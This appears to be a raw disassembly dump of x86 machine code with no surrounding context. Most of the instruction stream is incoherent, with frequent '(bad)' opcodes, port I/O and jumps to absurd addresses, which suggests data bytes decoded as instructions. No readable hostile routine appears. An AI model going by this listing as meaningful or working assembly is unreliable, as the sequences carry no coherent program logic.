  428f64:	pop    esi
  428f65:	scas   eax,DWORD PTR es:[edi]
  428f66:	mov    edi,0x1666cae9
  428f6b:	jge    0x428f1f
  428f6d:	push   esi
  428f6e:	sub    DWORD PTR ds:0x507c334b,esi
  428f74:	inc    esp
  428f75:	lea    edi,[ecx+0x41b69360]
  428f7b:	das    
  428f7c:	push   0xeaebdc35
  428f81:	stos   DWORD PTR es:[edi],eax
  428f82:	xchg   BYTE PTR [edx-0x23],bh
  428f85:	daa    
  428f86:	rcl    edx,cl
  428f88:	enter  0x5c29,0x63
  428f8c:	xor    bl,BYTE PTR [esi-0x30f3ae14]
  428f92:	pop    ss
  428f93:	arpl   WORD PTR [eax],cx
  428f95:	push   ebp
  428f96:	dec    esi
  428f97:	je     0x428f40
  428f99:	call   0x25bd2c43
  428f9e:	push   0xffffff81
  428fa0:	fcomp  st(4)
  428fa2:	in     eax,0x33
  428fa4:	jae    0x428f64
  428fa6:	out    dx,eax
  428fa7:	or     bh,BYTE PTR [edi-0x40]
  428faa:	clc    
  428fab:	aaa    
  428fac:	aaa    
  428fad:	sahf   
  428fae:	or     al,0x89
  428fb0:	push   esp
  428fb1:	lds    edi,FWORD PTR [edi+0x7c9a]
	...
  429013:	add    BYTE PTR [eax],al
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [edx+edx*4],ebp
  429024:	shr    DWORD PTR [ecx+0x1b614],1
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    ah,cl
  42902f:	mov    bh,0x56
  429031:	fwait
  429032:	rol    DWORD PTR [edi+0x15],cl
  429035:	popf   
  429036:	mov    edx,0x2a921bf2
  42903b:	mov    al,0xde
  42903d:	imul   ecx,DWORD PTR [eax+0x3e],0xffffffae
  429041:	mov    ebp,0xb054089f
  429046:	inc    edx
  429047:	das    
  429048:	pop    es
  429049:	adc    dh,ch
  42904b:	xor    ebp,DWORD PTR ds:0xdaec4637
  429051:	and    BYTE PTR [esi],dh
  429053:	mov    ds:0x53ac3b47,eax
  429058:	leave  
  429059:	sbb    ch,BYTE PTR [eax]
  42905b:	pusha  
  42905c:	outs   dx,BYTE PTR ds:[esi]
  42905d:	adc    ah,BYTE PTR [eax-0x46]
  429060:	(bad)  
  429062:	jle    0x42905b
  429064:	pop    ss
  429065:	stc    
  429066:	mov    esi,0x49842773
  42906b:	pop    ecx
  42906c:	imul   eax,DWORD PTR [edi],0xa1ec669f
  429072:	mov    ds:0x924ad6b9,al
  429077:	push   es
  429078:	fisubr DWORD PTR ds:0x482f996e
  42907e:	enter  0x455e,0x26
  429082:	(bad)
  429086:	ficom  DWORD PTR [ecx-0x375e936]
  42908c:	aam    0x3c
  42908e:	in     eax,0x1f
  429090:	pop    eax
  429091:	inc    ebp
  429092:	jle    0x42904b
  429094:	mov    ebp,0x1bfdb16d
  429099:	xor    ch,BYTE PTR [ebp-0x37]
  42909c:	and    DWORD PTR [ecx+0x4a],esp
  42909f:	or     al,0x91
  4290a1:	cmp    esi,DWORD PTR [esi-0x39f874a3]
  4290a7:	dec    eax
  4290a8:	(bad)  
  4290a9:	out    0x4b,al
  4290ab:	pop    edx
  4290ac:	dec    eax
  4290ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290ae:	sub    ecx,edi
  4290b0:	xchg   ecx,eax
  4290b1:	gs hlt 
  4290b3:	js     0x4290dd
  4290b5:	in     eax,0x7f
  4290b7:	sar    DWORD PTR [ecx+0x2a833932],1
  4290bd:	and    eax,ebp
  4290bf:	mov    al,ds:0x1fb8680c
  4290c4:	jmp    0xa651:0x929423bd
  4290cb:	xchg   ebx,eax
  4290cc:	add    al,BYTE PTR [edi]
  4290ce:	push   edx
  4290cf:	lahf   
  4290d0:	cmp    BYTE PTR [ecx],cl
  4290d2:	test   bh,dl
  4290d4:	xor    eax,esi
  4290d6:	rol    BYTE PTR [edi-0x53d9ae80],0x5d
  4290dd:	adc    bh,cl
  4290df:	push   ss
  4290e0:	pop    eax
  4290e1:	cmp    eax,0x7a3a5602
  4290e6:	cmp    edi,esp
  4290e8:	mov    cl,0xfd
  4290ea:	jp     0x429087
  4290ec:	sub    al,0xa8
  4290ee:	mov    eax,ds:0x42f7caf0
  4290f3:	sti    
  4290f4:	ret    0x1e25
  4290f7:	cdq    
  4290f8:	mov    al,0xf0
  4290fa:	xchg   esi,eax
  4290fb:	scas   al,BYTE PTR es:[edi]
  4290fc:	jle    0x4290e5
  4290fe:	dec    esp
  4290ff:	sub    eax,0x4f3136a
  429104:	pusha  
  429105:	int3   
  429106:	retf   0x97d6
  429109:	add    edi,edx
  42910b:	jo     0x429136
  42910d:	lahf   
  42910e:	aam    0x9c
  429110:	inc    esp
  429111:	sbb    BYTE PTR [edi],0xd6
  429114:	outs   dx,BYTE PTR ds:[esi]
  429115:	xchg   ebp,eax
  429116:	ja     0x42910c
  429118:	nop
  429119:	lahf   
  42911a:	fwait
  42911b:	imul   edi,DWORD PTR [edx-0xf822f8d],0xffffff9d
  429122:	fs mov ebp,0x12377ba7
  429128:	cwde   
  429129:	les    edi,FWORD PTR [edx+0x7e]
  42912c:	inc    edx
  42912d:	lds    eax,FWORD PTR [ebx+ebp*4-0x53b67f39]
  429134:	mov    BYTE PTR [eax],0x0
	...
  429193:	add    BYTE PTR [eax],al
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	mov    ecx,0x1b8b1b73
  4291a7:	mov    bh,0x1
  4291a9:	add    BYTE PTR [edi],al
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [ebx],bl
  4291af:	inc    eax
  4291b0:	sar    DWORD PTR [ebp+ebp*2-0x1c],0x74
  4291b5:	sub    ecx,0x88cab40d
  4291bb:	retf   0x6858
  4291be:	sub    al,0x29
  4291c0:	push   ds
  4291c1:	mov    ecx,0xf3c340ac
  4291c6:	stos   DWORD PTR es:[edi],eax
  4291c7:	inc    ebp
  4291c8:	leave  
  4291c9:	dec    esp
  4291ca:	xchg   ecx,eax
  4291cb:	clc    
  4291cc:	jle    0x4291e2
  4291ce:	cmp    al,0x8b
  4291d0:	dec    eax
  4291d1:	(bad)  
  4291d2:	push   edx
  4291d3:	pop    ebp
  4291d4:	mov    ebp,edx
  4291d6:	sar    edi,1
  4291d8:	mov    ebp,0xc4158ccc
  4291dd:	(bad)  
  4291de:	repnz sbb DWORD PTR [edi],0xa20f2aab
  4291e5:	cmp    DWORD PTR [edi-0x34161f9f],eax
  4291eb:	jl     0xdd28a1cc
  4291f1:	stc    
  4291f2:	and    BYTE PTR [edx-0x2],0xad
  4291f6:	imul   eax,DWORD PTR [ebx-0x56],0xbd64bc84
  4291fd:	fistp  WORD PTR [ecx]
  4291ff:	shr    bh,1
  429201:	push   edi
  429202:	mov    ds:0xdd792ce5,al
  429207:	imul   esi,DWORD PTR [ecx+0x62],0xffffff81
  42920b:	std    
  42920c:	jne    0x429213
  42920e:	xor    BYTE PTR [ecx-0x298ab994],ah
  429214:	inc    ebp
  429215:	adc    ecx,DWORD PTR [ebx]
  429217:	lods   al,BYTE PTR ds:[esi]
  429218:	(bad)  
  429219:	in     al,dx
  42921a:	sub    edi,0x2392506e
  429220:	cmp    ebp,esi
  429222:	sar    BYTE PTR [eax-0x62],0x10
  429226:	cmc    
  429227:	push   cs
  429228:	jl     0x4291ff
  42922a:	push   ebp
  42922b:	ins    BYTE PTR es:[edi],dx
  42922c:	jmp    0x4291df
  42922e:	adc    al,0x23
  429230:	xchg   ecx,eax
  429231:	sbb    DWORD PTR [eax+0x7ff79d8e],ebp
  429237:	ins    BYTE PTR es:[edi],dx
  429238:	jmp    0x4291ef
  42923a:	jecxz  0x4291c0
  42923c:	add    esi,DWORD PTR [eax+0x64a741ed]
  429242:	xchg   BYTE PTR [ecx-0x53],bh
  429245:	mov    ecx,DWORD PTR [edi]
  429247:	xlat   BYTE PTR ds:[ebx]
  429248:	jl     0x42928a
  42924a:	pop    es
  42924b:	mov    ds:0xefc8a261,eax
  429250:	jge    0x429280
  429252:	mov    ?,WORD PTR [eax+esi*8+0x41ef459c]
  429259:	cdq    
  42925a:	lea    ecx,[edx+0x28]
  42925d:	leave  
  42925e:	fldl2t 
  429260:	dec    ebp
  429261:	mov    DWORD PTR [edx],edx
  429263:	out    dx,eax
  429264:	shl    DWORD PTR ds:0xa925380b,cl
  42926a:	xchg   esp,eax
  42926b:	std    
  42926c:	les    edx,FWORD PTR [eax+0x5f9b6d97]
  429272:	dec    esp
  429273:	mov    eax,0x286cf2ea
  429278:	xchg   ebp,eax
  429279:	cmp    eax,0xdac49e04
  42927e:	sub    ch,BYTE PTR [edx]
  429280:	jns    0x429263
  429282:	in     eax,dx
  429283:	fcomp  DWORD PTR [edi-0x45]
  429286:	test   BYTE PTR [edi-0x8],al
  429289:	shr    cl,0x66
  42928c:	(bad)
  42928f:	inc    ebp
  429290:	std    
  429291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429292:	jne    0x4292e4
  429294:	xor    al,0xb3
  429296:	sub    BYTE PTR [eax+0x785b50de],0x35
  42929d:	scas   al,BYTE PTR es:[edi]
  42929e:	fbstp  TBYTE PTR [eax-0x7b]
  4292a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292a2:	loope  0x42926f
  4292a4:	imul   esi,DWORD PTR [ebp+0x51fa8ea9],0x36
  4292ab:	push   edi
  4292ac:	out    dx,al
  4292ad:	imul   eax,DWORD PTR ds:0x8e36,0xffffff8c
  4292b3:	pop    edi
  4292b4:	sahf   
	...
  429315:	add    al,dh
  429317:	adc    al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs push 0x22e88baf
  429327:	mov    eax,0x1070001
  42932c:	add    BYTE PTR [eax],al
  42932e:	dec    eax
  42932f:	enter  0xf403,0x65
  429333:	in     al,dx
  429334:	or     al,0x45
  429336:	adc    ecx,DWORD PTR [edi-0x6b]
  429339:	mov    BYTE PTR [esi],al
  42933b:	(bad)  
  42933c:	in     al,0xa0
  42933e:	jne    0x4292c5
  429340:	test   al,0xf7
  429342:	ins    DWORD PTR es:[edi],dx
  429343:	dec    ebp
  429344:	mov    WORD PTR [edi-0x6f],ss
  429347:	pop    ebp
  429348:	sbb    DWORD PTR [ebx],ebp
  42934a:	call   0xc73708b5
  42934f:	enter  0x88bf,0x84
  429353:	push   ss
  429354:	popf   
  429355:	(bad)  
  429356:	fcomp  DWORD PTR [ecx-0x16]
  429359:	pop    eax
  42935a:	dec    ebx
  42935b:	(bad)  
  42935c:	or     eax,0x1ebb8fe1
  429361:	xchg   ebx,eax
  429362:	iret   
  429363:	loop   0x42932f
  429365:	sti    
  429366:	stos   BYTE PTR es:[edi],al
  429367:	mov    bh,0xda
  429369:	dec    esp
  42936a:	dec    edi
  42936b:	mov    ebx,0x1f4be204
  429370:	xor    BYTE PTR [ecx+edi*4-0x60],cl
  429374:	test   eax,0x2798c163
  429379:	(bad)  
  42937a:	or     bh,BYTE PTR [ecx+ebx*8+0x39]
  42937e:	pop    ebx
  42937f:	sub    eax,0xc24ef082
  429384:	test   BYTE PTR [edi],al
  429386:	fistp  DWORD PTR [edi-0x6cd4dfb5]
  42938c:	mov    ah,0x23
  42938e:	gs pop eax
  429390:	sub    edi,ecx
  429392:	cmp    BYTE PTR [ecx+0x18202c97],bh
  429398:	and    ebx,ebx
  42939a:	dec    ebp
  42939b:	loope  0x42936b
  42939d:	ret    0x7e4e
  4293a0:	test   eax,0x2d13a593
  4293a5:	cmc    
  4293a6:	call   0x7083:0x21d0271e
  4293ad:	cmp    edx,DWORD PTR [ecx+0x68d4cca0]
  4293b3:	cmp    DWORD PTR ds:0x11d1ae1d,eax
  4293b9:	dec    ebx
  4293ba:	into   
  4293bb:	adc    BYTE PTR [edi],dh
  4293bd:	pop    es
  4293be:	cmovs  eax,DWORD PTR [ebx+0x56805ef3]
  4293c5:	cwde   
  4293c6:	sub    al,0x46
  4293c8:	mov    ?,WORD PTR [edx]
  4293ca:	ja     0x429438
  4293cc:	loope  0x429393
  4293ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293cf:	add    esi,DWORD PTR [eax+0x13]
  4293d2:	dec    esp
  4293d3:	ficomp WORD PTR [ecx+0x446b8e39]
  4293d9:	(bad)  
  4293da:	rcl    al,cl
  4293dc:	rcl    BYTE PTR [ecx],1
  4293de:	shl    BYTE PTR [edx+0x40],1
  4293e1:	lods   eax,DWORD PTR ds:[esi]
  4293e2:	ja     0x42940a
  4293e4:	push   edi
  4293e5:	ja     0x42945d
  4293e7:	inc    DWORD PTR [eax-0x5e2158d5]
  4293ed:	fwait
  4293ee:	test   ebp,0x7342da
  4293f4:	ds int 0xef
  4293f7:	sbb    DWORD PTR [ebx-0x3d6c1105],esi
  4293fd:	aas    
  4293fe:	push   ebp
  4293ff:	mov    dh,BYTE PTR [ecx]
  429401:	xlat   BYTE PTR ds:[ebx]
  429402:	and    eax,0xef0564f
  429407:	dec    ebx
  429408:	and    BYTE PTR [edi-0xe],ch
  42940b:	jp     0x42947b
  42940d:	outs   dx,DWORD PTR ds:[esi]
  42940e:	inc    esi
  42940f:	push   ebp
  429410:	fwait
  429411:	loope  0x429402
  429413:	sahf   
  429414:	sub    al,BYTE PTR [edi-0x7f]
  429417:	mov    eax,0x61c25ac4
  42941c:	bound  edx,QWORD PTR [esi+0x66]
  42941f:	mov    bh,dh
  429421:	xchg   esi,eax
  429422:	and    al,BYTE PTR [edi]
  429424:	aaa    
  429425:	pop    ss
  429426:	inc    esp
  429427:	outs   dx,DWORD PTR ds:[esi]
  429428:	(bad)  
  429429:	mov    bh,0x37
  42942b:	push   edi
  42942c:	pop    esi
  42942d:	aas    
  42942e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42942f:	mov    WORD PTR [edx-0x2807886f],ds
	...
  429495:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429499:	sub    al,0x53
  42949b:	ds jg  0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	adc    ebp,DWORD PTR [ecx-0x46d630b8]
  4294a8:	add    DWORD PTR [eax],eax
  4294aa:	pop    es
  4294ab:	add    DWORD PTR [eax],eax
  4294ad:	add    BYTE PTR [ecx],cl
  4294af:	adc    al,BYTE PTR [edi+0x7b]
  4294b2:	loopne 0x42944c
  4294b4:	ins    BYTE PTR es:[edi],dx
  4294b5:	jge    0x4294e5
  4294b7:	aas    
  4294b8:	or     BYTE PTR [ebx-0x629304ce],bh
  4294be:	sub    BYTE PTR [esi+0x3d],0x54
  4294c2:	and    al,0x55
  4294c4:	sbb    DWORD PTR [edi],eax
  4294c6:	sbb    al,0x92
  4294c8:	sub    ebp,DWORD PTR [esi+0x628ce80a]
  4294ce:	add    eax,0x4ed123bf
  4294d3:	pop    ebx
  4294d4:	mov    BYTE PTR [ebp-0x1a],bh
  4294d7:	jmp    0x95def647
  4294dc:	mov    ebx,gs
  4294de:	shr    cl,1
  4294e0:	arpl   WORD PTR [esi],si
  4294e2:	enter  0x7f64,0xba
  4294e6:	pop    ebx
  4294e7:	dec    edi
  4294e8:	pop    es
  4294e9:	andps  xmm2,xmm7
  4294ec:	mov    eax,ds:0x796ff56b
  4294f1:	scas   al,BYTE PTR es:[edi]
  4294f2:	std    
  4294f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294f4:	es pop ebp
  4294f6:	ins    BYTE PTR es:[edi],dx
  4294f7:	inc    ebx
  4294f8:	loop   0x42949e
  4294fa:	adc    BYTE PTR [ebx+0x38],dl
  4294fd:	loopne 0x429487
  4294ff:	adc    DWORD PTR [eax-0x3],ecx
  429502:	cld    
  429503:	aaa    
  429504:	(bad)  [ebp+ebx*4+0x6e]
  429508:	pop    esi
  429509:	jne    0x429523
  42950b:	and    dl,ah
  42950d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42950e:	repz or eax,0x7a634022
  429514:	scas   al,BYTE PTR es:[edi]
  429515:	popa   
  429516:	or     cl,bl
  429518:	nop
  429519:	mov    edi,0xe4da2a2e
  42951e:	fstp   DWORD PTR [ecx-0xd]
  429521:	jle    0x4294ba
  429523:	rcr    DWORD PTR [esi-0x7],0x9d
  429527:	fs jecxz 0x429574
  42952a:	in     al,0x29
  42952c:	dec    ebp
  42952d:	sub    BYTE PTR [edx+0x3cddebc2],dh
  429533:	daa    
  429534:	xor    dh,BYTE PTR [ebx]
  429536:	pop    ecx
  429537:	jg     0x4294fb
  429539:	es out dx,eax
  42953b:	lock scas al,BYTE PTR es:[edi]
  42953d:	(bad)  [edx-0x63140df4]
  429543:	mov    dh,0x6
  429545:	lock and al,0x68
  429548:	push   edi
  429549:	and    BYTE PTR [edx-0x49c94444],ah
  42954f:	js     0x429509
  429551:	in     eax,dx
  429552:	jno    0x429527
  429554:	and    BYTE PTR [edx-0x1146cba8],ah
  42955a:	or     ch,BYTE PTR [edx]
  42955c:	mov    ?,WORD PTR [esi+0x2]
  42955f:	cmp    BYTE PTR [edx],ch
  429561:	ja     0x4295dc
  429563:	sti    
  429564:	fdivr  DWORD PTR [esi]
  429566:	mov    dh,0xe2
  429568:	test   DWORD PTR [ecx-0xa7a5e25],0xafa5ce0e
  429572:	mov    bl,ch
  429574:	xchg   edx,eax
  429575:	stc    
  429576:	and    al,BYTE PTR [esi+0x24]
  429579:	mov    ds:0xcb7c3999,al
  42957e:	test   ebp,0xbcd9d804
  429584:	sbb    al,BYTE PTR [ebx]
  429586:	test   al,0xea
  429588:	(bad)  
  429589:	and    cl,BYTE PTR [ebp+0x372c0edb]
  42958f:	and    ch,ah
  429591:	popf   
  429592:	sahf   
  429593:	push   eax
  429594:	mov    ebp,0xba24c77d
  429599:	sbb    DWORD PTR [ecx+0x4f],0x6122ea70
  4295a0:	je     0x42955f
  4295a2:	fadd   QWORD PTR [esp+esi*1-0x1]
  4295a6:	outs   dx,BYTE PTR ds:[esi]
  4295a7:	(bad)  
  4295a8:	jecxz  0x429585
  4295aa:	mov    bl,0xaf
  4295ac:	mov    edx,0x86294cf0
  4295b1:	ins    BYTE PTR es:[edi],dx
  4295b2:	in     al,dx
  4295b3:	enter  0xa8,0x0
	...
  429613:	add    BYTE PTR [eax],al
  429615:	add    BYTE PTR [ebp+0x1d],ch
  429618:	out    0xc0,al
  42961a:	idiv   bl
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	mov    ebp,0x30b53d98
  429627:	mov    edx,0x1070001
  42962c:	add    BYTE PTR [eax],al
  42962e:	pop    ebp
  42962f:	lock add BYTE PTR [edi+ebp*1],dl
  429633:	lods   eax,DWORD PTR ds:[esi]
  429634:	cmc    
  429635:	(bad)  
  429637:	aad    0x1d
  429639:	add    eax,0x21886557
  42963e:	or     eax,DWORD PTR [edi+0x3e]
  429641:	int3   
  429642:	data16 fbld TBYTE PTR [eax+0x37]
  429646:	adc    BYTE PTR [ebx-0x57],ch
  429649:	adc    DWORD PTR ds:0x3a8598c9,edx
  42964f:	sub    DWORD PTR [esp+eiz*2],eax
  429652:	dec    ecx
  429653:	adc    cl,ch
  429655:	fadd   QWORD PTR [ebx]
  429657:	dec    esp
  429658:	or     eax,0xd321c0cd
  42965d:	mov    bh,0x19
  42965f:	loop   0x4296db
  429661:	loope  0x429661
  429663:	popa   
  429664:	addr16 sbb eax,0xe4015f1d
  42966a:	loop   0x429690
  42966c:	cdq    
  42966d:	es jg  0x429644
  429670:	and    DWORD PTR [ebx+0x30],esi
  429673:	test   al,0xfe
  429675:	fldcw  WORD PTR [edx+ecx*2]
  429678:	push   0x1b
  42967a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42967b:	jno    0x4296e6
  42967d:	mov    edx,0xe8842d6a
  429682:	cwde   
  429683:	xor    BYTE PTR [edi+ebp*4-0x75],dl
  429687:	xor    ah,ah
  429689:	cmp    BYTE PTR [edx+0x28],bh
  42968c:	out    0x4d,al
  42968e:	es in  eax,dx
  429690:	sti    
  429691:	xchg   edx,eax
  429692:	loope  0x4296e9
  429694:	in     al,dx
  429695:	ss push esp
  429697:	or     al,0x78
  429699:	sub    eax,0xb9850eb2
  42969e:	adc    al,0xdf
  4296a0:	mov    bl,0x89
  4296a2:	mov    esi,0xe33ccac6
  4296a7:	retf   
  4296a8:	push   eax
  4296a9:	mov    ch,0x77
  4296ab:	retf   
  4296ac:	dec    esi
  4296ad:	enter  0x3282,0x3d
  4296b1:	sbb    bl,ch
  4296b3:	jmp    0x4296ab
  4296b5:	test   eax,0x49eef60f
  4296ba:	loopne 0x42972e
  4296bc:	xor    al,0x76
  4296be:	xchg   ecx,eax
  4296bf:	jp     0x4296ed
  4296c1:	jbe    0x4296d4
  4296c3:	cmp    ch,ch
  4296c5:	(bad)  [edi+esi*8]
  4296c8:	hlt    
  4296c9:	fdiv   st(5),st
  4296cb:	mov    ds:0x600f9fae,eax
  4296d0:	std    
  4296d1:	pushf  
  4296d2:	sub    BYTE PTR [esi],cl
  4296d4:	fs iret 
  4296d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296d7:	imul   esp,DWORD PTR ds:0xf310efd6,0xc1b8c07e
  4296e1:	cdq    
  4296e2:	fnstenv [edx+0x6b]
  4296e5:	int    0x39
  4296e7:	cmp    al,0xcb
  4296e9:	es cmc 
  4296eb:	dec    ebp
  4296ec:	shr    DWORD PTR [ecx-0x5dbe5a60],cl
  4296f2:	(bad)  [ecx+0x393ab4d0]
  4296f8:	rol    ah,1
  4296fa:	jl     0x4296a2
  4296fc:	mov    ebp,0x4e3559d6
  429701:	js     0x4296cd
  429703:	imul   ebp,DWORD PTR [ebp-0x37],0xec3cb332
  42970a:	adc    bl,BYTE PTR [eax]
  42970c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42970d:	mov    DWORD PTR [ecx+ebx*1+0x765d2f50],esi
  429714:	pop    esi
  429715:	xor    al,0x66
  429717:	sbb    edx,ecx
  429719:	xor    BYTE PTR [edi+0x50ed60a6],dh
  42971f:	dec    ebp
  429720:	mov    bl,0x8c
  429722:	push   cs
  429723:	int3   
  429724:	adc    dl,dl
  429726:	push   es
  429727:	(bad)  
  429728:	adc    al,0xfa
  42972a:	call   0xe230cfb
  42972f:	mov    ecx,0x6173ea3c
  429734:	mov    cl,0x0
	...
  429796:	xor    BYTE PTR [edx-0x21],al
  429799:	(bad)  
  42979a:	(bad)  
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	movzx  esi,BYTE PTR [ecx+ecx*4-0x55]
  4297a6:	aaa    
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	adc    eax,0xff6601f4
  4297b3:	inc    edx
  4297b4:	not    DWORD PTR [ecx]
  4297b6:	mov    ah,0x57
  4297b8:	int    0xfa
  4297ba:	inc    esp
  4297bb:	or     cl,ah
  4297bd:	sahf   
  4297be:	push   ebp
  4297bf:	dec    ebx
  4297c0:	scas   al,BYTE PTR es:[edi]
  4297c1:	pop    eax
  4297c2:	fwait
  4297c3:	and    al,dl
  4297c5:	icebp  
  4297c6:	xchg   edx,eax
  4297c7:	stc    
  4297c8:	loop   0x429837
  4297ca:	inc    esi
  4297cb:	dec    esi
  4297cc:	dec    ebx
  4297cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297ce:	pop    ds
  4297cf:	lock outs dx,DWORD PTR ds:[esi]
  4297d1:	fsub   DWORD PTR [esi]
  4297d3:	sbb    al,0x6a
  4297d5:	inc    edx
  4297d6:	idiv   BYTE PTR [ebp+0x5a191336]
  4297dc:	add    al,0x72
  4297de:	xlat   BYTE PTR ds:[ebx]
  4297df:	add    al,0xd4
  4297e1:	mov    bh,0x1a
  4297e3:	push   ss
  4297e4:	add    ah,ch
  4297e6:	and    ah,BYTE PTR [esi+0x70]
  4297e9:	fnsave ds:0xc962e8ce
  4297ef:	(bad)  
  4297f1:	fcmovb st,st(4)
  4297f3:	(bad)  
  4297f4:	add    al,0xa7
  4297f6:	nop
  4297f7:	data16 xchg BYTE PTR [ebx+edi*2+0x22],cl
  4297fc:	pop    ss
  4297fd:	xchg   al,bl
  4297ff:	cli    
  429800:	lahf   
  429801:	jno    0x4297a5
  429803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429804:	sbb    ecx,ebp
  429806:	fwait
  429807:	ins    BYTE PTR es:[edi],dx
  429808:	test   DWORD PTR [edx+0x7732be38],ebp
  42980e:	inc    esp
  42980f:	mov    ebp,0x1caf5605
  429814:	mov    dl,0x9c
  429816:	cdq    
  429817:	push   ss
  429818:	jb     0x429806
  42981a:	ja     0x429819
  42981c:	inc    edx
  42981d:	add    al,0xdf
  42981f:	gs jb  0x429857
  429822:	dec    ebp
  429823:	xor    eax,0x53f21f4a
  429828:	dec    esp
  429829:	fnsave [ecx]
  42982b:	std    
  42982c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42982d:	and    DWORD PTR [eax+0xd388994],ebp
  429833:	fcomip st,st(7)
  429835:	mov    dh,0x65
  429837:	sbb    ecx,DWORD PTR [ebx]
  429839:	or     al,0x6e
  42983b:	push   ss
  42983c:	dec    si
  42983e:	pop    ebp
  42983f:	fld    QWORD PTR [ebx]
  429841:	into   
  429842:	or     BYTE PTR [ebx],bl
  429844:	pop    es
  429845:	sbb    BYTE PTR [ecx+ebp*8],bh
  429848:	ficomp WORD PTR [esi+0x49]
  42984b:	sub    eax,0x7c783457
  429850:	cli    
  429851:	mov    dl,dh
  429853:	push   ds
  429854:	test   al,0x5d
  429856:	sti    
  429857:	pop    ecx
  429858:	xchg   esp,eax
  429859:	(bad)  
  42985a:	adc    BYTE PTR [esi+ebp*1+0x7d],al
  42985e:	(bad)  
  42985f:	sbb    al,0x85
  429861:	xor    ebx,DWORD PTR cs:[ebp+0x12]
  429865:	ror    DWORD PTR [edx],0xe9
  429868:	ins    DWORD PTR es:[edi],dx
  429869:	jne    0x429861
  42986b:	push   es
  42986c:	ror    ecx,1
  42986e:	push   0xffffffd4
  429870:	mov    eax,ds:0x2facd1bc
  429875:	sbb    BYTE PTR [esp+esi*4+0x60ae5dc2],dh
  42987c:	lods   eax,DWORD PTR ds:[esi]
  42987d:	adc    BYTE PTR [esi],bl
  42987f:	stc    
  429880:	lods   al,BYTE PTR ds:[esi]
  429881:	mov    dh,0x7b
  429883:	sbb    al,0x8f
  429885:	sti    
  429886:	and    esi,DWORD PTR [edi+0x64b4f412]
  42988c:	cld    
  42988d:	enter  0xd223,0x97
  429891:	and    BYTE PTR [ecx-0x3],al
  429894:	push   esp
  429895:	(bad)  
  429896:	fs aaa 
  429898:	pop    ds
  429899:	mov    ecx,0x5f399ade
  42989e:	sub    BYTE PTR [ecx-0x3c],dl
  4298a1:	and    eax,0xc2cced37
  4298a6:	push   ds
  4298a7:	outs   dx,DWORD PTR ds:[esi]
  4298a8:	outs   dx,BYTE PTR ds:[esi]
  4298a9:	add    al,0xab
  4298ab:	in     eax,dx
  4298ac:	into   
  4298ad:	lahf   
  4298ae:	ins    BYTE PTR es:[edi],dx
  4298af:	ror    BYTE PTR [ecx+ecx*4],0x37
  4298b3:	je     0x42989f
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	out    0xfe,al
  429924:	jecxz  0x429974
  429926:	ds mov esp,0x1070001
  42992c:	add    BYTE PTR [eax],al
  42992e:	punpcklwd mm7,DWORD PTR [edi+0x43bed330]
  429935:	sbb    DWORD PTR [ecx*2-0x7ccac5be],ebx
  42993c:	ror    DWORD PTR [edx+0x13],0x9f
  429940:	std    
  429941:	xor    bl,ch
  429943:	ins    DWORD PTR es:[edi],dx
  429944:	sbb    eax,edx
  429946:	sub    ebp,DWORD PTR [ebx-0x5819caa3]
  42994c:	mov    bh,0x12
  42994e:	(bad)  
  42994f:	fldln2 
  429951:	pop    edi
  429952:	nop
  429953:	xchg   esi,eax
  429954:	pop    ss
  429955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429956:	in     al,dx
  429957:	mov    eax,ds:0x9ba99da7
  42995c:	cwde   
  42995d:	fimul  WORD PTR [edx-0x3d]
  429960:	lock das 
  429962:	neg    BYTE PTR [ebp-0x3a]
  429965:	dec    ebp
  429966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429967:	jne    0x42997f
  429969:	cdq    
  42996a:	ins    DWORD PTR es:[edi],dx
  42996b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42996c:	call   0xfe1dcc9d
  429971:	gs out 0x77,eax
  429974:	or     BYTE PTR [esi+ebx*2+0x76],cl
  429978:	jnp    0x4299d7
  42997a:	loop   0x42995e
  42997c:	(bad)  
  42997d:	jmp    0x4299ba
  42997f:	bound  eax,QWORD PTR [ebp+0x1ca46764]
  429985:	xchg   esp,eax
  429986:	adc    al,0xc8
  429988:	mov    ecx,0x10b5bc22
  42998d:	inc    edi
  42998e:	adc    eax,0xa9464cc0
  429993:	lahf   
